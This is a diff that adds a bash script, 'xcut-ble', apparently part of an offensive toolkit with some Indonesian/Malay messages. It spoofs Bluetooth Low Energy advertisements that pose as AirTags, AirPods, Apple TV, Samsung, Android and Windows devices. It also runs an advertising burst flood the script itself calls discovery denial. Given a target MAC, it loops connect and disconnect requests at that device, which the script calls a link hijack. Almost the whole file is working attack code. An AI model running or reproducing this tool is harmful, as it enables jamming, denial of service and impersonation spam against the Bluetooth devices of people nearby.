@@ -1,0 +1,95 @@
+#!/bin/bash
+# xcut-ble - BLE advertisement spoofer (kernel MGMT channel).
+#   on <mode> [arg]   add advertising instances (works with/without bluetoothd)
+#                     modes: airtag|airpods|appletv|homepod|samsung|
+#                            android <name>|windows <text>|ibeacon|all
+#   off               remove all advertising instances
+#   check             probe mgmt channel + list instances
+#   scan [sec]        scan nearby BLE devices
+#   jam [MAC]         SYN-2x burst flood all adv channels (discovery denial);
+#                     with MAC also connect-floods that device (link hijack)
+#   jam stop          stop burst + connect flood, clear instances
+set -u
+
+BIN="${BIN:-$(dirname "$(realpath "$0")")}"
+RAW="${DIS_BLE:-$BIN/xcut-ble-raw}"
+JAMPID="/tmp/xcut-jam.pid"
+
+usage() {
+    cat <<'EOF'
+xcut-ble: BLE advertisement spoofer / soft-jammer (mgmt channel; no bluetoothd stop needed)
+  on airtag|airpods|appletv|homepod|samsung|android <name>|windows [text]|ibeacon|all
+  off              remove all advertising instances
+  check            show adapter + instances via btmgmt
+  scan [sec]       scan nearby BLE devices
+  burst [mode]     adv-churn flood (discovery denial, global effect)
+  jam [BLE-MAC]    burst + optional connect-flood to jam a specific device
+  jam stop         stop jam, clear everything
+EOF
+    exit 0
+}
+
+stop_jam() {
+    pkill -9 -f "xcut-ble-raw burst" 2>/dev/null
+    pkill -9 -f "bluetoothctl connect" 2>/dev/null
+    pkill -9 -f "bluetoothctl disconnect" 2>/dev/null
+    if [ -e "$JAMPID" ]; then
+        while read -r p; do kill -9 "$p" 2>/dev/null; done < "$JAMPID"
+    fi
+    python3 "$RAW" off >/dev/null 2>&1
+    rm -f "$JAMPID"
+}
+
+case "${1:-}" in
+    on)
+        echo "BLE spam: ${2:-airpods}"
+        trap 'true' INT TERM HUP
+        python3 "$RAW" on "${2:-airpods}" "${3:-}"
+        ;;
+    burst)
+        echo "BLE burst flood (soft-jam). Ctrl-C utk berhenti"
+        python3 "$RAW" burst "$2" "$3"
+        echo "burst berhenti - untuk jaga-jaga xcut ble jam stop"
+        ;;
+    jam)
+        if [ "${2:-}" = "stop" ]; then
+            stop_jam
+            exit 0
+        fi
+        stop_jam >/dev/null
+        echo "BLE soft-jam: global adv burst + [${2:-no target}]"
+        echo "  Ctrl-C utk berhenti"
+        if [ -n "${2:-}" ]; then
+            mac="$2"
+            echo "  connect-flooding $mac (link hijack)"
+            : > "$JAMPID"
+            ( while true; do
+                  bluetoothctl connect "$mac" >/dev/null 2>&1
+                  bluetoothctl disconnect "$mac" >/dev/null 2>&1
+                  sleep 0.2
+              done ) > /dev/null 2>&1 &
+            echo $! > "$JAMPID"
+            trap 'pkill -9 -f bluetoothctl 2>/dev/null; kill -9 "$(cat "$JAMPID")" 2>/dev/null; rm -f "$JAMPID"' EXIT INT TERM
+        else
+            rm -f "$JAMPID"
+        fi
+        python3 "$RAW" burst all
+        pkill -9 -f "bluetoothctl connect" 2>/dev/null
+        rm -f "$JAMPID"
+        echo "jam berhenti, instance dibersihkan"
+        ;;
+    off)
+        python3 "$RAW" off
+        ;;
+    check)
+        python3 "$RAW" check
+        btmgmt -i 0 advinfo 2>&1 || true
+        ;;
+    scan)
+        sec="${2:-10}"
+        echo "Scanning BLE for ${sec}s ..."
+        timeout "$sec" bluetoothctl --timeout "$sec" scan on >/dev/null 2>&1
+        bluetoothctl devices | sed 's/^Device //' | sort -u -f
+        ;;
+    *) usage ;;
+esac
